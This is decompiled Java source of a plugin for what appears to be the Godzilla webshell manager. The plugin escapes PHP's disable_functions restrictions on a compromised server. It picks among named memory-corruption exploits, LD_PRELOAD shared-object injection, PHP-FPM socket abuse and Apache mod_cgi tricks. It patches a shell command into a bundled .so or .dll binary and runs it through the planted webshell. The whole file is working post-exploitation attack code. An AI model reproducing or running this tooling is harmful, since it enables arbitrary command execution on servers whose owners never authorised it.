/*     */ package shells.plugins.php;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.ShellManage;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.ByteArrayOutputStream;
/*     */ import java.io.InputStream;
/*     */ import java.util.Arrays;
/*     */ import java.util.HashMap;
/*     */ import java.util.UUID;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTabbedPane;
/*     */ import javax.swing.JTextField;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "BypassDisableFunctions", DisplayName = "BypassDisableFunctions")
/*     */ public class BypassDisableFunctions
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "BypassDisableFunctions.Run";
/*  38 */   private static final String[] BYPASS_MEM_PAYLOAD_LINUX = new String[] { "php-filter-bypass", "disfunpoc", "php-json-bypass", "php7-backtrace-bypass", "php7-gc-bypass", "php7-SplDoublyLinkedList-uaf", "procfs_bypass", "php74-FFI-BUG", "php5-imap_open", "php7-FFI", "PHP74-FFI-Serializable" };
/*  39 */   private static final String[] BYPASS_MEM_PAYLOAD_WINDOWS = new String[] { "php-filter-bypass", "php-com" };
/*  40 */   private static final String[] BYPASS_ENV_PAYLOAD = new String[] { "LD_PRELOAD" };
/*  41 */   private static final String[] BYPASS_AMC_PAYLOAD = new String[] { "Apache_mod_cgi" };
/*  42 */   private static final String[] BYPASS_FPM_ADDRESS = new String[] { "unix:///var/run/php5-fpm.sock", "unix:///var/run/php/php5-fpm.sock", "unix:///var/run/php-fpm/php5-fpm.sock", "unix:///var/run/php/php7-fpm.sock", "/var/run/php/php7.2-fpm.sock", "/tmp/php-cgi-56.sock", "/usr/local/var/run/php7.3-fpm.sock", "localhost:9000", "127.0.0.1:9000" };
/*  43 */   private static final HashMap<String, Integer> EXT_INFO = new HashMap<>();
/*     */   
/*     */   private final JPanel panel;
/*     */   
/*     */   private boolean loadState;
/*     */   
/*     */   private ShellEntity shellEntity;
/*     */   
/*     */   private Payload payload;
/*     */   
/*     */   private Encoding encoding;
/*     */   
/*     */   private final JPanel memBypassPanel;
/*     */   
/*     */   private final JPanel envBypassPanel;
/*     */   
/*     */   private final JPanel amcBypassPanel;
/*     */   
/*     */   private final JTabbedPane tabbedPane;
/*     */   
/*     */   private PhpEvalCode phpEvalCode;
/*     */   private final JTextField memCommandTextField;
/*     */   private final JLabel memPayloadLabel;
/*     */   private final JLabel memCommandLabel;
/*     */   private final JButton memRunButton;
/*     */   private final JLabel memTempPathLabel;
/*     */   private final JTextField memTempPathTextField;
/*     */   private final RTextArea memResultTextArea;
/*     */   private final JComboBox<String> memPayloadComboBox;
/*     */   private final JSplitPane memSplitPane;
/*     */   private final JTextField envCommandTextField;
/*     */   private final JLabel envPayloadLabel;
/*     */   private final JLabel envSoPathLabel;
/*     */   private final JTextField envTempPathTextField;
/*     */   private final JLabel envCommandLabel;
/*     */   private final JButton envRunButton;
/*     */   private final RTextArea envResultTextArea;
/*     */   private final JComboBox<String> envPayloadComboBox;
/*     */   private final JSplitPane envSplitPane;
/*     */   private final JPanel fpmBypassPanel;
/*     */   private final JTextField fpmCommandTextField;
/*     */   private final JLabel fpmAddressLabel;
/*     */   private final JLabel fpmSoPathLabel;
/*     */   private final JTextField fpmTempPathTextField;
/*     */   private final JLabel fpmCommandLabel;
/*     */   private final JButton fpmRunButton;
/*     */   private final RTextArea fpmResultTextArea;
/*     */   private final JComboBox<String> fpmAddressComboBox;
/*     */   private final JSplitPane fpmSplitPane;
/*     */   private final JTextField amcCommandTextField;
/*     */   private final JLabel amcPayloadLabel;
/*     */   private final JLabel amcCommandLabel;
/*     */   private final JButton amcRunButton;
/*     */   private final RTextArea amcResultTextArea;
/*     */   private final JComboBox<String> amcPayloadComboBox;
/*     */   private final JSplitPane amcSplitPane;
/*     */   
/*     */   static {
/* 101 */     EXT_INFO.put("ant_x86_so_start", Integer.valueOf(275));
/* 102 */     EXT_INFO.put("ant_x86_so_end", Integer.valueOf(504));
/* 103 */     EXT_INFO.put("ant_x64_so_start", Integer.valueOf(434));
/* 104 */     EXT_INFO.put("ant_x64_so_end", Integer.valueOf(665));
/* 105 */     EXT_INFO.put("ant_x86_dll_start", Integer.valueOf(1544));
/* 106 */     EXT_INFO.put("ant_x86_dll_end", Integer.valueOf(1683));
/* 107 */     EXT_INFO.put("ant_x64_dll_start", Integer.valueOf(1552));
/* 108 */     EXT_INFO.put("ant_x64_dll_end", Integer.valueOf(1691));
/*     */   }
/*     */ 
/*     */   
/*     */   public BypassDisableFunctions() {
/* 113 */     this.panel = new JPanel(new BorderLayout());
/* 114 */     this.tabbedPane = new JTabbedPane();
/* 115 */     this.memBypassPanel = new JPanel(new BorderLayout());
/* 116 */     this.envBypassPanel = new JPanel(new BorderLayout());
/* 117 */     this.fpmBypassPanel = new JPanel(new BorderLayout());
/* 118 */     this.amcBypassPanel = new JPanel(new BorderLayout());
/*     */     
/* 120 */     this.memPayloadComboBox = new JComboBox<>(BYPASS_MEM_PAYLOAD_LINUX);
/* 121 */     this.memRunButton = new JButton("Run");
/* 122 */     this.memResultTextArea = new RTextArea();
/* 123 */     this.memCommandTextField = new JTextField(35);
/* 124 */     this.memPayloadLabel = new JLabel("payload");
/* 125 */     this.memCommandLabel = new JLabel("command");
/* 126 */     this.memTempPathLabel = new JLabel("Temp Path");
/* 127 */     this.memTempPathTextField = new JTextField(30);
/* 128 */     this.memSplitPane = new JSplitPane();
/*     */     
/* 130 */     this.envPayloadComboBox = new JComboBox<>(BYPASS_ENV_PAYLOAD);
/* 131 */     this.envRunButton = new JButton("Run");
/* 132 */     this.envResultTextArea = new RTextArea();
/* 133 */     this.envCommandTextField = new JTextField(35);
/* 134 */     this.envPayloadLabel = new JLabel("payload");
/* 135 */     this.envCommandLabel = new JLabel("command");
/* 136 */     this.envSoPathLabel = new JLabel("Temp Path");
/* 137 */     this.envTempPathTextField = new JTextField(30);
/* 138 */     this.envSplitPane = new JSplitPane();
/*     */ 
/*     */     
/* 141 */     this.fpmAddressComboBox = new JComboBox<>(BYPASS_FPM_ADDRESS);
/* 142 */     this.fpmRunButton = new JButton("Run");
/* 143 */     this.fpmResultTextArea = new RTextArea();
/* 144 */     this.fpmCommandTextField = new JTextField(35);
/* 145 */     this.fpmAddressLabel = new JLabel("FPM/FCGI 地址");
/* 146 */     this.fpmCommandLabel = new JLabel("command");
/* 147 */     this.fpmSoPathLabel = new JLabel("Temp Path");
/* 148 */     this.fpmTempPathTextField = new JTextField(30);
/* 149 */     this.fpmSplitPane = new JSplitPane();
/*     */ 
/*     */     
/* 152 */     this.amcPayloadComboBox = new JComboBox<>(BYPASS_AMC_PAYLOAD);
/* 153 */     this.amcRunButton = new JButton("Run");
/* 154 */     this.amcResultTextArea = new RTextArea();
/* 155 */     this.amcCommandTextField = new JTextField(35);
/* 156 */     this.amcPayloadLabel = new JLabel("payload");
/* 157 */     this.amcCommandLabel = new JLabel("command");
/* 158 */     this.amcSplitPane = new JSplitPane();
/*     */ 
/*     */     
/* 161 */     this.fpmCommandTextField.setAutoscrolls(true);
/* 162 */     this.fpmCommandTextField.setText("whoami");
/* 163 */     this.fpmSplitPane.setOrientation(0);
/* 164 */     this.fpmAddressComboBox.setEditable(true);
/*     */     
/* 166 */     this.memCommandTextField.setAutoscrolls(true);
/* 167 */     this.memCommandTextField.setText("whoami");
/* 168 */     this.memSplitPane.setOrientation(0);
/*     */     
/* 170 */     this.envCommandTextField.setAutoscrolls(true);
/* 171 */     this.envCommandTextField.setText("whoami");
/* 172 */     this.envSplitPane.setOrientation(0);
/*     */ 
/*     */     
/* 175 */     this.amcCommandTextField.setAutoscrolls(true);
/* 176 */     this.amcCommandTextField.setText("whoami");
/* 177 */     this.amcSplitPane.setOrientation(0);
/*     */ 
/*     */     
/* 180 */     JPanel memTopPanel = new JPanel();
/*     */     
/* 182 */     memTopPanel.add(this.memPayloadLabel);
/* 183 */     memTopPanel.add(this.memPayloadComboBox);
/* 184 */     memTopPanel.add(this.memTempPathLabel);
/* 185 */     memTopPanel.add(this.memTempPathTextField);
/* 186 */     memTopPanel.add(this.memCommandLabel);
/* 187 */     memTopPanel.add(this.memCommandTextField);
/* 188 */     memTopPanel.add(this.memRunButton);
/*     */     
/* 190 */     this.memSplitPane.setTopComponent(memTopPanel);
/* 191 */     this.memSplitPane.setBottomComponent(new JScrollPane((Component)this.memResultTextArea));
/* 192 */     this.memBypassPanel.add(this.memSplitPane);
/*     */     
/* 194 */     JPanel envTopPanel = new JPanel();
/* 195 */     envTopPanel.add(this.envPayloadLabel);
/* 196 */     envTopPanel.add(this.envPayloadComboBox);
/* 197 */     envTopPanel.add(this.envSoPathLabel);
/* 198 */     envTopPanel.add(this.envTempPathTextField);
/* 199 */     envTopPanel.add(this.envCommandLabel);
/* 200 */     envTopPanel.add(this.envCommandTextField);
/* 201 */     envTopPanel.add(this.envRunButton);
/*     */ 
/*     */ 
/*     */     
/* 205 */     this.envSplitPane.setTopComponent(envTopPanel);
/* 206 */     this.envSplitPane.setBottomComponent(new JScrollPane((Component)this.envResultTextArea));
/* 207 */     this.envBypassPanel.add(this.envSplitPane);
/*     */     
/* 209 */     JPanel fpmTopPanel = new JPanel();
/* 210 */     fpmTopPanel.add(this.fpmAddressLabel);
/* 211 */     fpmTopPanel.add(this.fpmAddressComboBox);
/* 212 */     fpmTopPanel.add(this.fpmSoPathLabel);
/* 213 */     fpmTopPanel.add(this.fpmTempPathTextField);
/* 214 */     fpmTopPanel.add(this.fpmCommandLabel);
/* 215 */     fpmTopPanel.add(this.fpmCommandTextField);
/* 216 */     fpmTopPanel.add(this.fpmRunButton);
/*     */     
/* 218 */     this.fpmSplitPane.setTopComponent(fpmTopPanel);
/* 219 */     this.fpmSplitPane.setBottomComponent(new JScrollPane((Component)this.fpmResultTextArea));
/* 220 */     this.fpmBypassPanel.add(this.fpmSplitPane);
/*     */ 
/*     */ 
/*     */     
/* 224 */     JPanel amcTopPanel = new JPanel();
/*     */     
/* 226 */     amcTopPanel.add(this.amcPayloadLabel);
/* 227 */     amcTopPanel.add(this.amcPayloadComboBox);
/* 228 */     amcTopPanel.add(this.amcCommandLabel);
/* 229 */     amcTopPanel.add(this.amcCommandTextField);
/* 230 */     amcTopPanel.add(this.amcRunButton);
/*     */     
/* 232 */     this.amcSplitPane.setTopComponent(amcTopPanel);
/* 233 */     this.amcSplitPane.setBottomComponent(new JScrollPane((Component)this.amcResultTextArea));
/* 234 */     this.amcBypassPanel.add(this.amcSplitPane);
/*     */ 
/*     */ 
/*     */     
/* 238 */     this.tabbedPane.addTab("MemBypass", this.memBypassPanel);
/* 239 */     this.tabbedPane.addTab("EnvBypass", this.envBypassPanel);
/* 240 */     this.tabbedPane.addTab("FPMBypass", this.fpmBypassPanel);
/* 241 */     this.tabbedPane.addTab("AMCBypass", this.amcBypassPanel);
/*     */ 
/*     */     
/* 244 */     this.panel.add(this.tabbedPane);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private void memRunButtonClick(ActionEvent actionEvent) {
/* 251 */     String payloadNameString = (String)this.memPayloadComboBox.getSelectedItem();
/* 252 */     String codeString = new String(functions.getResourceAsByteArray(this, String.format("assets/%s.php", new Object[] { payloadNameString })));
/* 253 */     String cmd = this.memCommandTextField.getText();
/* 254 */     ReqParameter reqParameter = new ReqParameter();
/* 255 */     String resultFile = this.memTempPathTextField.getText() + "." + functions.md5(UUID.randomUUID().toString());
/*     */     
/* 257 */     if ("php-filter-bypass".equals(payloadNameString)) {
/* 258 */       cmd = String.format("%s > %s", new Object[] { cmd, resultFile });
/*     */     }
/*     */     
/* 261 */     reqParameter.add("cmd", cmd);
/* 262 */     String resultString = eval(codeString, reqParameter);
/* 263 */     this.memResultTextArea.setText(resultString);
/*     */     
/* 265 */     if ("php-filter-bypass".equals(payloadNameString)) {
/* 266 */       this.memResultTextArea.setText(this.encoding.Decoding(this.payload.downloadFile(resultFile)));
/* 267 */       this.payload.deleteFile(resultFile);
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private void fpmRunButtonClick(ActionEvent actionEvent) throws Exception {
/* 276 */     String payloadNameString = "FPM";
/* 277 */     String codeString = new String(functions.getResourceAsByteArray(this, String.format("assets/%s.php", new Object[] { payloadNameString })));
/* 278 */     ReqParameter reqParameter = new ReqParameter();
/* 279 */     String tempDir = functions.formatDir(this.fpmTempPathTextField.getText());
/* 280 */     String cmdFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
/* 281 */     String resultFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
/* 282 */     String soFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
/* 283 */     String fpmHost = "";
/* 284 */     int fpmPort = -1;
/* 285 */     String fpmAddress = this.fpmAddressComboBox.getEditor().getItem().toString().trim();
/*     */     
/*     */     try {
/* 288 */       if (fpmAddress.startsWith("unix")) {
/* 289 */         fpmHost = fpmAddress;
/* 290 */       } else if (fpmAddress.startsWith("/")) {
/* 291 */         fpmHost = String.format("unix://%s", new Object[] { fpmAddress });
/*     */       } else {
/* 293 */         String[] is = fpmAddress.split(":");
/* 294 */         fpmHost = is[0];
/* 295 */         fpmPort = Integer.valueOf(is[1]).intValue();
/*     */       } 
/* 297 */     } catch (Exception e) {
/* 298 */       Log.error(e);
/* 299 */       GOptionPane.showMessageDialog(null, e.getMessage());
/*     */       
/*     */       return;
/*     */     } 
/* 303 */     reqParameter.add("fpm_host", fpmHost);
/* 304 */     reqParameter.add("fpm_port", String.valueOf(fpmPort));
/* 305 */     reqParameter.add("soFile", soFile);
/* 306 */     reqParameter.add("cmdFile", cmdFile);
/* 307 */     reqParameter.add("resultFile", resultFile);
/* 308 */     reqParameter.add("so", generateExt(generateCmd(cmdFile, resultFile)));
/* 309 */     reqParameter.add("cmd", this.fpmCommandTextField.getText());
/*     */ 
/*     */ 
/*     */     
/* 313 */     String resultString = eval(codeString, reqParameter);
/* 314 */     this.fpmResultTextArea.setText(resultString);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   private void envRunButtonClick(ActionEvent actionEvent) throws Exception {
/* 320 */     if (!this.payload.isWindows()) {
/* 321 */       String payloadNameString = (String)this.envPayloadComboBox.getSelectedItem();
/* 322 */       String codeString = new String(functions.getResourceAsByteArray(this, String.format("assets/%s.php", new Object[] { payloadNameString })));
/* 323 */       ReqParameter reqParameter = new ReqParameter();
/* 324 */       String tempDir = functions.formatDir(this.envTempPathTextField.getText());
/* 325 */       String cmdFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
/* 326 */       String resultFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
/* 327 */       String soFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
/* 328 */       reqParameter.add("soFile", soFile);
/* 329 */       reqParameter.add("cmdFile", cmdFile);
/* 330 */       reqParameter.add("resultFile", resultFile);
/* 331 */       reqParameter.add("so", generateExt(generateCmd(cmdFile, resultFile)));
/* 332 */       reqParameter.add("cmd", this.envCommandTextField.getText());
/* 333 */       String resultString = eval(codeString, reqParameter);
/* 334 */       this.envResultTextArea.setText(resultString);
/*     */     } else {
/* 336 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "仅支持Linux", "警告", 2);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   private void amcRunButtonClick(ActionEvent actionEvent) throws Exception {
/* 342 */     String payloadNameString = (String)this.amcPayloadComboBox.getSelectedItem();
/* 343 */     String codeString = new String(functions.getResourceAsByteArray(this, String.format("assets/%s.php", new Object[] { payloadNameString })));
/* 344 */     String shellUrl = this.shellEntity.getUrl();
/* 345 */     int lastIndex = shellUrl.lastIndexOf("/");
/* 346 */     if (lastIndex != -1) {
/* 347 */       shellUrl = shellUrl.substring(0, lastIndex + 1);
/*     */     }
/* 349 */     ReqParameter reqParameter = new ReqParameter();
/* 350 */     reqParameter.add("shellurl", shellUrl);
/* 351 */     reqParameter.add("cmd", this.amcCommandTextField.getText());
/* 352 */     String resultString = eval(codeString, reqParameter);
/* 353 */     this.amcResultTextArea.setText(resultString);
/*     */   }
/*     */ 
/*     */   
/*     */   private byte[] generateExt(String cmd) throws Exception {
/* 358 */     int bits = 86;
/* 359 */     String suffix = "so";
/*     */     try {
/* 361 */       bits = this.payload.isX64() ? 64 : 86;
/* 362 */     } catch (Exception e) {
/* 363 */       Log.error(e);
/*     */     } 
/*     */     try {
/* 366 */       if (!this.payload.isWindows()) {
/* 367 */         suffix = "so";
/*     */       } else {
/* 369 */         suffix = "dll";
/*     */       } 
/* 371 */     } catch (Exception e) {
/* 372 */       Log.error(e);
/*     */     } 
/* 374 */     int start = ((Integer)EXT_INFO.get(String.format("ant_x%s_%s_start", new Object[] { Integer.valueOf(bits), suffix }))).intValue();
/* 375 */     int end = ((Integer)EXT_INFO.get(String.format("ant_x%s_%s_end", new Object[] { Integer.valueOf(bits), suffix }))).intValue();
/* 376 */     InputStream inputStream = BypassDisableFunctions.class.getResourceAsStream(String.format("assets/ant_x%s.%s", new Object[] { Integer.valueOf(bits), suffix }));
/* 377 */     int cmdLen = end - start;
/* 378 */     byte[] so = functions.readInputStream(inputStream);
/* 379 */     inputStream.close();
/* 380 */     ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
/* 381 */     byte[] _cmd = cmd.getBytes();
/* 382 */     byte[] temp = new byte[cmdLen - _cmd.length];
/* 383 */     Arrays.fill(temp, (byte)32);
/* 384 */     so[end] = 0;
/* 385 */     outputStream.write(so, 0, start);
/* 386 */     outputStream.write(_cmd, 0, _cmd.length);
/* 387 */     outputStream.write(temp, 0, temp.length);
/* 388 */     outputStream.write(so, end, so.length - end);
/* 389 */     return outputStream.toByteArray();
/*     */   }
/*     */   
/*     */   private String generateCmd(String cmdFile, String resultFile) {
/* 393 */     if (!this.payload.isWindows()) {
/* 394 */       return "bash " + cmdFile + " > " + resultFile;
/*     */     }
/* 396 */     return "cmd /c " + cmdFile + " > " + resultFile;
/*     */   }
/*     */   
/*     */   private String eval(String code, ReqParameter reqParameter) {
/*     */     try {
/* 401 */       if (this.phpEvalCode == null) {
/*     */         try {
/* 403 */           if (this.phpEvalCode == null) {
/* 404 */             ShellManage shellManage = this.shellEntity.getFrame();
/* 405 */             this.phpEvalCode = (PhpEvalCode)shellManage.getPlugin("P_Eval_Code");
/*     */           } 
/* 407 */         } catch (Exception e) {
/* 408 */           GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "no find plugin P_Eval_Code!");
/* 409 */           return "";
/*     */         } 
/*     */       }
/* 412 */       return this.phpEvalCode.eval(code, reqParameter);
/* 413 */     } catch (Throwable e) {
/* 414 */       return "";
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 420 */     this.shellEntity = shellEntity;
/* 421 */     this.payload = this.shellEntity.getPayloadModule();
/* 422 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 423 */     this.envTempPathTextField.setText(this.payload.currentDir());
/* 424 */     this.fpmTempPathTextField.setText(this.payload.currentDir());
/* 425 */     this.memTempPathTextField.setText(this.payload.currentDir());
/* 426 */     if (this.payload.isWindows()) {
/* 427 */       this.memPayloadComboBox.removeAllItems();
/* 428 */       for (String payloadName : BYPASS_MEM_PAYLOAD_WINDOWS) {
/* 429 */         this.memPayloadComboBox.addItem(payloadName);
/*     */       }
/*     */     } 
/* 432 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 439 */     return this.panel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\BypassDisableFunctions.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */